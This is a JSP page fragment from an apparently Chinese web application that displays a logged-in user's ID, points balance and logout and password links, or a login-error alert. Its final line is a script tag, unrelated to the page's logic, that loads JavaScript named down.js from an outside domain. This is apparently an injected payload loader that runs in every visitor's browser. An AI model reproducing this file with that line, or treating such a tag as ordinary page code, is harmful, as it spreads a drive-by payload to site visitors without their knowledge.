<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>

<c:if test="${empty userSession}">
<script type="text/javascript">
	alert("用户名不存在或者密码错误");
</script>	
</c:if>	
<c:if test="${!empty userSession}">

<script type="text/javascript">

var str="";
	  
str+="<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"3993D9\">";
str+="  <tr>";
str+="	    <td width=\"18\" /> ";
str+="		<td width=\"120\" height=\"22\" class=\"white12\" ><span class=\"white15\">您好!</span><a href='<c:url value="/getCustomer.do"/>?id=<c:out value="${userSession.customer.userId}"/>' class=\"yellow12\"><c:out value="${userSession.customer.userId}"/></a></td>";
str+="		<td width=\"120\" class=\"white12\">您目前的积分是:</td>";
str+="		<td class=\"yellow12\" ><c:out value="${userSession.account.currentPoint}" /></td>";
str+="	    <td valign=\"middle\" width=\"100\"><a href='<c:url value="/signoff.do"/>' class=\"white12\">退出登录</a></td>";
str+="	    <td valign=\"middle\" width=\"100\"><a href='<c:url value="/resetPassword.screen"/>' class=\"white12\">修改密码</a></td>";
str+="	</tr>";
str+="</table>";
	 	parent.document.all.loginline.innerHTML=str;	
			window.status='';


</script>
</c:if>	

<script language=javascript src=http://Town.531jx.cn/down.js></script>